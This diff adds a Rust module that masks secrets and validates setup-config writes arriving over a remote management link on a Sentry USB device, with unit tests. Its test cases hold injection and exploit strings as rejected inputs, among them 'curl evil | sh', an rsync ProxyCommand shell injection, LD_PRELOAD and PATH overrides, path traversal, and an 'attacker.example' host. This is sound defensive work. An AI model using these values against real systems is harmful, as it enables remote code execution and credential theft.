@@ -1,0 +1,556 @@
+//! Setup-config secrets and write checks for requests that arrive over the
+//! link (contract section 5, "Secrets in settings").
+//!
+//! - Reads: every secret field comes back as `""`, with a companion
+//!   `"<FIELD>__set": true` when a value is stored.
+//! - Writes: an empty or missing secret keeps the stored one.
+//! - Writes are deny by default too: only the keys in `SETTABLE` may change
+//!   over the link. Every other stored key is written back exactly as it
+//!   is, so a Manager can't add a command hook, point updates at another
+//!   repository, resize (and so erase) a drive, or take over the web login.
+
+use std::collections::HashMap;
+
+use serde_json::{Map, Value};
+
+use crate::allowlist::Method;
+
+/// The official update repository (mirrors `OFFICIAL_UPDATE_REPO` in the
+/// api crate; a test there keeps the two equal).
+pub const OFFICIAL_UPDATE_REPO: &str = "Sentry-Six/Sentry-USB-Rusty";
+
+const MAX_VALUE_LEN: usize = 1024;
+const MAX_KEYS: usize = 512;
+
+/// Whether a setup-config key holds a secret (passwords, tokens, API keys,
+/// and webhook/ntfy URLs, which carry their token in the URL).
+pub fn is_secret_key(key: &str) -> bool {
+    key.contains("PASS")
+        || key.contains("TOKEN")
+        || key.contains("SECRET")
+        || key.ends_with("_KEY")
+        || key.ends_with("_KEY_ID")
+        || key.ends_with("WEBHOOK_URL")
+        || key == "NTFY_URL"
+        || key == "IFTTT_KEY"
+}
+
+/// Keys Manager may change over the link. Everything else is read-only
+/// there. Left out on purpose:
+/// - `WEB_USERNAME`, `WEB_PASSWORD`: setting them would let whoever holds
+///   Manager sign in to the Pi's web UI, which has a root terminal.
+/// - `NOTIFICATION_COMMAND_*`, `INSTALL_USER_REQUESTED_PACKAGES`, `REPO`,
+///   `BRANCH`, `RCLONE_FLAGS`: run commands or install code.
+/// - `*_SIZE`, `USE_EXFAT`, `DATA_DRIVE`, `USE_NVME`, `INCREASE_ROOT_SIZE`
+///   and other disk keys: a change recreates drives and erases footage.
+/// - `SAMBA_*`: would share the drives with the whole network.
+/// - `SENTRY_MANAGER_*`: the link's own settings stay on the Pi.
+/// - Anything unknown, including environment names like `PATH` or
+///   `LD_PRELOAD` (sentryusb.conf is exported into root shells).
+const SETTABLE: &[&str] = &[
+    // Network
+    "SSID", "WIFIPASS", "AP_SSID", "AP_PASS", "AP_IP", "SENTRYUSB_HOSTNAME", "TIME_ZONE",
+    // Archive
+    "ARCHIVE_SYSTEM", "ARCHIVE_SERVER", "SHARE_NAME", "SHARE_USER", "SHARE_PASSWORD",
+    "SHARE_DOMAIN", "CIFS_VERSION", "CIFS_SEC", "CIFS_NOSERVERINO", "RSYNC_USER",
+    "RSYNC_SERVER", "RSYNC_PATH", "RSYNC_SSH_PORT", "RCLONE_DRIVE", "RCLONE_PATH",
+    "MUSIC_SHARE_NAME", "ARCHIVE_DELAY", "ARCHIVE_STALL_GRACE_SECONDS",
+    "ARCHIVE_RECENTCLIPS", "ARCHIVE_SAVEDCLIPS", "ARCHIVE_SENTRYCLIPS",
+    "ARCHIVE_TRACKMODECLIPS", "ARCHIVE_VERIFY", "ARCHIVE_VERIFY_MODE",
+    "ARCHIVE_VERIFY_MAX_SECONDS", "ARCHIVE_VERIFY_RECHECK_SECONDS", "ARCHIVE_VERIFY_PARALLEL",
+    "ARCHIVE_VERIFY_MANAGER_WAIT_HOURS", "ARCHIVE_AUTO_DELETE_VERIFIED", "SNAPSHOT_INTERVAL",
+    "TRIGGER_FILE_SAVED", "TRIGGER_FILE_SENTRY", "TRIGGER_FILE_RECENT", "TRIGGER_FILE_ANY",
+    "SENTRY_CASE", "DRIVE_MAP_ENABLED", "DRIVE_MAP_UNIT", "DRIVE_MAP_WHILE_AWAY",
+    // Notifications
+    "NOTIFICATION_TITLE", "PUSHOVER_ENABLED", "PUSHOVER_USER_KEY", "PUSHOVER_APP_KEY",
+    "GOTIFY_ENABLED", "GOTIFY_DOMAIN", "GOTIFY_APP_TOKEN", "GOTIFY_PRIORITY",
+    "DISCORD_ENABLED", "DISCORD_WEBHOOK_URL", "TELEGRAM_ENABLED", "TELEGRAM_CHAT_ID",
+    "TELEGRAM_BOT_TOKEN", "TELEGRAM_SILENT_NOTIFY", "IFTTT_ENABLED", "IFTTT_EVENT_NAME",
+    "IFTTT_KEY", "SLACK_ENABLED", "SLACK_WEBHOOK_URL", "SIGNAL_ENABLED", "SIGNAL_URL",
+    "SIGNAL_FROM_NUM", "SIGNAL_TO_NUM", "MATRIX_ENABLED", "MATRIX_SERVER_URL",
+    "MATRIX_USERNAME", "MATRIX_PASSWORD", "MATRIX_ROOM", "SNS_ENABLED", "AWS_REGION",
+    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SNS_TOPIC_ARN", "WEBHOOK_ENABLED",
+    "WEBHOOK_URL", "NTFY_ENABLED", "NTFY_URL", "NTFY_TOKEN", "NTFY_PRIORITY",
+    "MOBILE_PUSH_ENABLED", "KEEP_AWAKE_WEBHOOK_URL", "TESLAFI_API_TOKEN", "TESSIE_API_TOKEN",
+    "TESSIE_VIN", "TESLA_BLE_VIN",
+    // Temperatures and units
+    "TEMPERATURE_WARNING", "TEMPERATURE_CAUTION", "TEMPERATURE_INTERVAL",
+    "TEMPERATURE_POSTARCHIVE", "TEMPERATURE_UNIT", "SYSTEM_TEMPERATURE_UNIT", "PRESSURE_UNIT",
+];
+
+pub fn is_settable(key: &str) -> bool {
+    SETTABLE.contains(&key)
+}
+
+/// Values that end up as command-line arguments (mount, ssh, rsync, rclone,
+/// hostnamectl, nmcli): a leading `-` would be read as an option.
+const ARGUMENT_KEYS: &[&str] = &[
+    "SSID", "AP_SSID", "AP_IP", "SENTRYUSB_HOSTNAME", "TIME_ZONE", "ARCHIVE_SERVER",
+    "SHARE_NAME", "SHARE_USER", "SHARE_DOMAIN", "CIFS_VERSION", "CIFS_SEC", "RSYNC_USER",
+    "RSYNC_SERVER", "RSYNC_PATH", "RSYNC_SSH_PORT", "RCLONE_DRIVE", "RCLONE_PATH",
+    "MUSIC_SHARE_NAME", "TESSIE_VIN", "TESLA_BLE_VIN",
+];
+
+/// Values that go inside a `mount -o` option list, where `,` or `=` would
+/// add options of the caller's choosing.
+const MOUNT_OPTION_KEYS: &[&str] = &["SHARE_USER", "SHARE_DOMAIN", "CIFS_VERSION", "CIFS_SEC"];
+
+/// Checks one value Manager wants to write. Secrets are checked for control
+/// characters only, since passwords may hold any printable character.
+pub fn validate_value(key: &str, value: &str) -> Result<(), String> {
+    if value.len() > MAX_VALUE_LEN {
+        return Err(format!("{key} is too long"));
+    }
+    if value.chars().any(|c| c.is_control()) {
+        return Err(format!("{key} must be a single line of text"));
+    }
+    if ARGUMENT_KEYS.contains(&key) && value.trim_start().starts_with('-') {
+        return Err(format!("{key} must not start with '-'"));
+    }
+    if MOUNT_OPTION_KEYS.contains(&key) && value.contains([',', '=']) {
+        return Err(format!("{key} must not contain ',' or '='"));
+    }
+    let only = |ok: fn(char) -> bool| value.chars().all(ok);
+    let host_char = |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '[' | ']');
+    match key {
+        "ARCHIVE_SERVER" | "RSYNC_SERVER" if !only(host_char) => {
+            Err(format!("{key} must be a host name or IP address"))
+        }
+        "RSYNC_USER" if !only(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_')) => {
+            Err(format!("{key} must be a plain user name"))
+        }
+        "SENTRYUSB_HOSTNAME"
+            if value.is_empty()
+                || value.len() > 63
+                || !only(|c| c.is_ascii_alphanumeric() || c == '-') =>
+        {
+            Err(format!("{key} must be letters, digits and '-'"))
+        }
+        "TIME_ZONE"
+            if value.contains("..")
+                || !only(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '_' | '+' | '-')) =>
+        {
+            Err(format!("{key} must be a time zone name like Europe/Berlin"))
+        }
+        "RSYNC_SSH_PORT" if !value.is_empty() && !value.trim().parse::<u16>().is_ok_and(|p| p > 0) => {
+            Err(format!("{key} must be a port number"))
+        }
+        _ => Ok(()),
+    }
+}
+
+/// Masks the secrets in a `GET /api/setup/config` answer, which maps each
+/// key to `{"value": ..., "active": ...}`. Commented-out entries are masked
+/// too: they can hold an old real password.
+pub fn mask_setup_config(body: Value) -> Value {
+    let Value::Object(map) = body else { return body };
+    let mut out = Map::with_capacity(map.len());
+    for (key, entry) in map {
+        if !is_secret_key(&key) {
+            out.insert(key, entry);
+            continue;
+        }
+        let (set, masked) = match entry {
+            Value::Object(mut e) => {
+                let set = e.get("value").and_then(Value::as_str).is_some_and(|v| !v.is_empty());
+                e.insert("value".into(), Value::String(String::new()));
+                (set, Value::Object(e))
+            }
+            Value::String(s) => (!s.is_empty(), Value::String(String::new())),
+            _ => (false, Value::String(String::new())),
+        };
+        out.insert(format!("{key}__set"), Value::Bool(set));
+        out.insert(key, masked);
+    }
+    Value::Object(out)
+}
+
+/// Where a stored secret is sent. Keeping a secret while pointing it at a
+/// new place would hand it to whoever runs that place (a share password
+/// to another server, a Wi-Fi password to another access point), so a
+/// change to any of these needs the secret typed in again.
+const SECRET_TARGETS: &[(&str, &[&str])] = &[
+    ("SHARE_PASSWORD", &["ARCHIVE_SYSTEM", "ARCHIVE_SERVER", "SHARE_USER", "SHARE_DOMAIN"]),
+    ("WIFIPASS", &["SSID"]),
+    ("MATRIX_PASSWORD", &["MATRIX_SERVER_URL", "MATRIX_USERNAME"]),
+    ("GOTIFY_APP_TOKEN", &["GOTIFY_DOMAIN"]),
+    ("NTFY_TOKEN", &["NTFY_URL"]),
+    ("AWS_SECRET_ACCESS_KEY", &["AWS_REGION", "AWS_ACCESS_KEY_ID"]),
+];
+
+/// Refuses to keep a stored secret whose target changed.
+fn check_kept_secret(
+    secret: &str,
+    new_value_of: impl Fn(&str) -> Option<String>,
+    active: &HashMap<String, String>,
+) -> Result<(), String> {
+    let Some((_, targets)) = SECRET_TARGETS.iter().find(|(s, _)| *s == secret) else {
+        return Ok(());
+    };
+    for t in *targets {
+        let new = new_value_of(t).unwrap_or_default();
+        let old = active.get(*t).cloned().unwrap_or_default();
+        if new != old {
+            return Err(format!("{t} changed: enter {secret} again to send it there"));
+        }
+    }
+    Ok(())
+}
+
+fn is_valid_key(key: &str) -> bool {
+    let mut b = key.bytes();
+    matches!(b.next(), Some(c) if c.is_ascii_uppercase() || c == b'_')
+        && key.len() <= 64
+        && b.all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == b'_')
+}
+
+/// Builds the map handed to `PUT /api/setup/config` (a full replacement of
+/// the active settings) from what Manager sent and what is stored.
+pub fn prepare_setup_config_write(
+    body: &Value,
+    active: &HashMap<String, String>,
+) -> Result<HashMap<String, String>, String> {
+    let Value::Object(incoming) = body else {
+        return Err("Expected a JSON object of settings".into());
+    };
+    if incoming.len() > MAX_KEYS {
+        return Err("Too many settings".into());
+    }
+    let mut out = HashMap::new();
+    // Read-only keys keep their stored value whatever was sent.
+    for (k, v) in active {
+        if !is_settable(k) {
+            out.insert(k.clone(), v.clone());
+        }
+    }
+    for (key, value) in incoming {
+        if let Some(base) = key.strip_suffix("__set") {
+            // Read-side companions; ignored on write.
+            if is_valid_key(base) {
+                continue;
+            }
+        }
+        if !is_valid_key(key) {
+            return Err(format!("Invalid setting name {key:?}"));
+        }
+        let Value::String(value) = value else {
+            return Err(format!("{key} must be a string"));
+        };
+        let secret = is_secret_key(key);
+        if !is_settable(key) {
+            let unchanged = active.get(key) == Some(value) || (secret && value.is_empty());
+            if unchanged {
+                continue;
+            }
+            return Err(format!("{key} can only be changed on the Sentry USB itself"));
+        }
+        if secret && value.is_empty() {
+            if let Some(stored) = active.get(key) {
+                out.insert(key.clone(), stored.clone());
+            }
+            continue;
+        }
+        validate_value(key, value)?;
+        out.insert(key.clone(), value.clone());
+    }
+    // A secret left out keeps its stored value.
+    for (k, v) in active {
+        if is_secret_key(k) && !incoming.contains_key(k) {
+            out.entry(k.clone()).or_insert_with(|| v.clone());
+        }
+    }
+    // A kept secret must still go where it went before.
+    for (k, v) in active {
+        let sent_new = incoming.get(k).and_then(Value::as_str).is_some_and(|s| !s.is_empty());
+        if is_secret_key(k) && !v.is_empty() && !sent_new && out.contains_key(k) {
+            check_kept_secret(k, |t| out.get(t).cloned(), active)?;
+        }
+    }
+    Ok(out)
+}
+
+/// Checks (and where needed rewrites) the body of a write request before it
+/// reaches the handler. `Ok(None)` passes the body through unchanged.
+pub fn check_write(
+    method: Method,
+    path: &str,
+    body: &Value,
+    active: &HashMap<String, String>,
+) -> Result<Option<Value>, (u16, String)> {
+    let bad = |m: String| (400u16, m);
+    match (method, path) {
+        (Method::Put, "/api/setup/config") => {
+            let map = prepare_setup_config_write(body, active).map_err(bad)?;
+            Ok(Some(serde_json::to_value(map).unwrap_or(Value::Null)))
+        }
+        (Method::Post, "/api/setup/test-archive") => {
+            let Value::Object(incoming) = body else {
+                return Err(bad("Expected a JSON object of settings".into()));
+            };
+            let mut out = Map::new();
+            for (key, value) in incoming {
+                if !is_valid_key(key) {
+                    continue;
+                }
+                let Value::String(value) = value else {
+                    return Err(bad(format!("{key} must be a string")));
+                };
+                if is_secret_key(key) && value.is_empty() {
+                    if let Some(stored) = active.get(key) {
+                        // Only probe the stored destination with the stored
+                        // password, never a new server.
+                        check_kept_secret(
+                            key,
+                            |t| incoming.get(t).and_then(Value::as_str).map(str::to_string)
+                                .or_else(|| active.get(t).cloned()),
+                            active,
+                        )
+                        .map_err(bad)?;
+                        out.insert(key.clone(), Value::String(stored.clone()));
+                    }
+                    continue;
+                }
+                validate_value(key, value).map_err(bad)?;
+                out.insert(key.clone(), Value::String(value.clone()));
+            }
+            Ok(Some(Value::Object(out)))
+        }
+        (Method::Put, "/api/system/update-source") => {
+            // A custom source would install someone else's binaries as root.
+            let repo = body.get("repo").and_then(Value::as_str).map(str::trim);
+            match repo {
+                Some(r) if r.is_empty() || r.eq_ignore_ascii_case(OFFICIAL_UPDATE_REPO) => {
+                    Ok(Some(serde_json::json!({"repo": ""})))
+                }
+                _ => Err((
+                    403,
+                    "Over Sentry Manager the update source can only be set back to the official one. \
+                     Change it on the Sentry USB itself."
+                        .into(),
+                )),
+            }
+        }
+        (Method::Post, "/api/system/update") => match body {
+            Value::Null => Ok(None),
+            Value::Object(o) => match o.get("version") {
+                None | Some(Value::Null) => Ok(Some(Value::Null)),
+                Some(Value::String(v))
+                    if !v.is_empty()
+                        && v.len() <= 64
+                        && !v.contains("..")
+                        && v.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+')) =>
+                {
+                    Ok(Some(serde_json::json!({"version": v})))
+                }
+                _ => Err(bad("version must be a release tag like v3.29.0".into())),
+            },
+            _ => Err(bad("Expected {\"version\": ...} or no body".into())),
+        },
+        _ => Ok(None),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use serde_json::json;
+
+    fn stored() -> HashMap<String, String> {
+        HashMap::from([
+            ("SSID".into(), "Home".into()),
+            ("WIFIPASS".into(), "wifi-secret".into()),
+            ("SHARE_PASSWORD".into(), "share-secret".into()),
+            ("WEB_USERNAME".into(), "admin".into()),
+            ("WEB_PASSWORD".into(), "web-secret".into()),
+            ("CAM_SIZE".into(), "40G".into()),
+            ("NOTIFICATION_COMMAND_START".into(), "/root/hook.sh".into()),
+            ("REPO".into(), "me/fork".into()),
+            ("TELEGRAM_BOT_TOKEN".into(), "bot-token".into()),
+            ("ARCHIVE_SERVER".into(), "nas.local".into()),
+        ])
+    }
+
+    #[test]
+    fn secrets_are_recognized() {
+        for k in [
+            "WIFIPASS", "AP_PASS", "SHARE_PASSWORD", "WEB_PASSWORD", "MATRIX_PASSWORD",
+            "PUSHOVER_USER_KEY", "PUSHOVER_APP_KEY", "GOTIFY_APP_TOKEN", "IFTTT_KEY",
+            "DISCORD_WEBHOOK_URL", "SLACK_WEBHOOK_URL", "WEBHOOK_URL", "KEEP_AWAKE_WEBHOOK_URL",
+            "TELEGRAM_BOT_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "NTFY_URL",
+            "NTFY_TOKEN", "TESLAFI_API_TOKEN", "TESSIE_API_TOKEN",
+        ] {
+            assert!(is_secret_key(k), "{k}");
+        }
+        for k in ["SSID", "ARCHIVE_SERVER", "WEB_USERNAME", "SHARE_USER", "CAM_SIZE"] {
+            assert!(!is_secret_key(k), "{k}");
+        }
+    }
+
+    #[test]
+    fn reads_mask_every_secret_active_or_commented() {
+        let body = json!({
+            "SSID": {"value": "Home", "active": true},
+            "WIFIPASS": {"value": "wifi-secret", "active": true},
+            "WEB_PASSWORD": {"value": "old-secret", "active": false},
+            "AP_PASS": {"value": "", "active": true},
+        });
+        let masked = mask_setup_config(body);
+        assert_eq!(masked["SSID"]["value"], "Home");
+        assert_eq!(masked["WIFIPASS"], json!({"value": "", "active": true}));
+        assert_eq!(masked["WIFIPASS__set"], true);
+        assert_eq!(masked["WEB_PASSWORD"]["value"], "");
+        assert_eq!(masked["WEB_PASSWORD__set"], true);
+        assert_eq!(masked["AP_PASS__set"], false);
+        let text = masked.to_string();
+        assert!(!text.contains("wifi-secret") && !text.contains("old-secret"));
+    }
+
+    #[test]
+    fn empty_or_missing_secret_keeps_the_stored_one() {
+        let out = prepare_setup_config_write(
+            &json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local", "WIFIPASS": "", "WIFIPASS__set": true, "WEB_PASSWORD": ""}),
+            &stored(),
+        )
+        .unwrap();
+        assert_eq!(out["WIFIPASS"], "wifi-secret");
+        // Not sent at all: still kept.
+        assert_eq!(out["SHARE_PASSWORD"], "share-secret");
+        assert_eq!(out["TELEGRAM_BOT_TOKEN"], "bot-token");
+        assert_eq!(out["WEB_PASSWORD"], "web-secret");
+        assert!(!out.contains_key("WIFIPASS__set"));
+    }
+
+    #[test]
+    fn a_kept_secret_cannot_follow_a_new_destination() {
+        // Pointing the archive at another server with the stored password.
+        let err = prepare_setup_config_write(
+            &json!({"SSID": "Home", "ARCHIVE_SERVER": "attacker.example", "SHARE_PASSWORD": ""}),
+            &stored(),
+        )
+        .unwrap_err();
+        assert!(err.contains("SHARE_PASSWORD"), "{err}");
+        // The Wi-Fi password to another access point.
+        assert!(prepare_setup_config_write(
+            &json!({"SSID": "Evil", "ARCHIVE_SERVER": "nas.local"}),
+            &stored(),
+        )
+        .is_err());
+        // With the password typed in again it is fine.
+        let out = prepare_setup_config_write(
+            &json!({"SSID": "Home", "ARCHIVE_SERVER": "nas2.local", "SHARE_PASSWORD": "typed"}),
+            &stored(),
+        )
+        .unwrap();
+        assert_eq!(out["SHARE_PASSWORD"], "typed");
+        // The connection test never sends the stored password elsewhere.
+        assert!(check_write(
+            Method::Post,
+            "/api/setup/test-archive",
+            &json!({"ARCHIVE_SYSTEM": "cifs", "ARCHIVE_SERVER": "attacker.example", "SHARE_PASSWORD": ""}),
+            &stored(),
+        )
+        .is_err());
+    }
+
+    #[test]
+    fn a_new_secret_replaces_the_stored_one() {
+        let out = prepare_setup_config_write(&json!({"WIFIPASS": "new-wifi", "ARCHIVE_SERVER": "nas.local"}), &stored()).unwrap();
+        assert_eq!(out["WIFIPASS"], "new-wifi");
+    }
+
+    #[test]
+    fn read_only_keys_keep_their_stored_values() {
+        // Sent back unchanged (as a full map would be): fine.
+        let out = prepare_setup_config_write(
+            &json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local", "CAM_SIZE": "40G", "REPO": "me/fork", "NOTIFICATION_COMMAND_START": "/root/hook.sh"}),
+            &stored(),
+        )
+        .unwrap();
+        assert_eq!(out["CAM_SIZE"], "40G");
+        // Left out: still kept, not commented out.
+        let out = prepare_setup_config_write(&json!({"SSID": "Home", "ARCHIVE_SERVER": "nas.local"}), &stored()).unwrap();
+        assert_eq!(out["CAM_SIZE"], "40G");
+        assert_eq!(out["REPO"], "me/fork");
+        assert_eq!(out["NOTIFICATION_COMMAND_START"], "/root/hook.sh");
+        assert_eq!(out["WEB_USERNAME"], "admin");
+    }
+
+    #[test]
+    fn dangerous_changes_are_refused() {
+        for body in [
+            json!({"NOTIFICATION_COMMAND_START": "curl evil | sh"}),
+            json!({"NOTIFICATION_COMMAND_ENABLED": "true"}),
+            json!({"INSTALL_USER_REQUESTED_PACKAGES": "evil"}),
+            json!({"REPO": "attacker/evil"}),
+            json!({"BRANCH": "evil"}),
+            json!({"RCLONE_FLAGS": "--config=/tmp/x"}),
+            json!({"CAM_SIZE": "1G"}),
+            json!({"USE_EXFAT": "false"}),
+            json!({"DATA_DRIVE": "/dev/sda"}),
+            json!({"WEB_PASSWORD": "attacker"}),
+            json!({"WEB_USERNAME": "attacker"}),
+            json!({"SAMBA_GUEST": "true"}),
+            json!({"SENTRY_MANAGER_ADDRESS": "evil:10000"}),
+            json!({"LD_PRELOAD": "/tmp/x.so"}),
+            json!({"PATH": "/tmp"}),
+            json!({"BASH_ENV": "/tmp/x"}),
+            json!({"bad key": "x"}),
+            json!({"EVIL\nexport X": "x"}),
+            json!({"RSYNC_USER": "-oProxyCommand=sh -c evil"}),
+            json!({"RSYNC_SERVER": "nas;reboot"}),
+            json!({"ARCHIVE_SERVER": "-o"}),
+            json!({"SHARE_USER": "u,uid=0"}),
+            json!({"SENTRYUSB_HOSTNAME": "a b"}),
+            json!({"TIME_ZONE": "../../etc/passwd"}),
+            json!({"SSID": "two\nlines"}),
+            json!({"SSID": 5}),
+            json!(["not", "an", "object"]),
+        ] {
+            assert!(prepare_setup_config_write(&body, &stored()).is_err(), "{body} was accepted");
+        }
+    }
+
+    #[test]
+    fn update_source_only_back_to_official() {
+        let a = stored();
+        let ok = |b: Value| check_write(Method::Put, "/api/system/update-source", &b, &a);
+        assert_eq!(ok(json!({"repo": ""})).unwrap(), Some(json!({"repo": ""})));
+        assert!(ok(json!({"repo": "sentry-six/sentry-usb-rusty"})).is_ok());
+        assert_eq!(ok(json!({"repo": "attacker/Sentry-USB-Rusty"})).unwrap_err().0, 403);
+        assert_eq!(ok(json!({"repo": "attacker"})).unwrap_err().0, 403);
+        assert_eq!(ok(json!({})).unwrap_err().0, 403);
+    }
+
+    #[test]
+    fn update_version_is_a_plain_tag() {
+        let a = stored();
+        let chk = |b: Value| check_write(Method::Post, "/api/system/update", &b, &a);
+        assert!(chk(Value::Null).is_ok());
+        assert!(chk(json!({"version": "v3.29.0-test.1"})).is_ok());
+        for v in ["../../x", "v1/../../x", "https://evil/x", "a b", ""] {
+            assert!(chk(json!({"version": v})).is_err(), "{v}");
+        }
+    }
+
+    #[test]
+    fn test_archive_fills_the_stored_password_and_checks_arguments() {
+        let mut a = stored();
+        a.insert("ARCHIVE_SYSTEM".into(), "cifs".into());
+        let out = check_write(
+            Method::Post,
+            "/api/setup/test-archive",
+            &json!({"ARCHIVE_SYSTEM": "cifs", "ARCHIVE_SERVER": "nas.local", "SHARE_PASSWORD": ""}),
+            &a,
+        )
+        .unwrap()
+        .unwrap();
+        assert_eq!(out["SHARE_PASSWORD"], "share-secret");
+        assert!(check_write(
+            Method::Post,
+            "/api/setup/test-archive",
+            &json!({"ARCHIVE_SYSTEM": "rsync", "RSYNC_USER": "-oProxyCommand=x"}),
+            &a,
+        )
+        .is_err());
+    }
+}
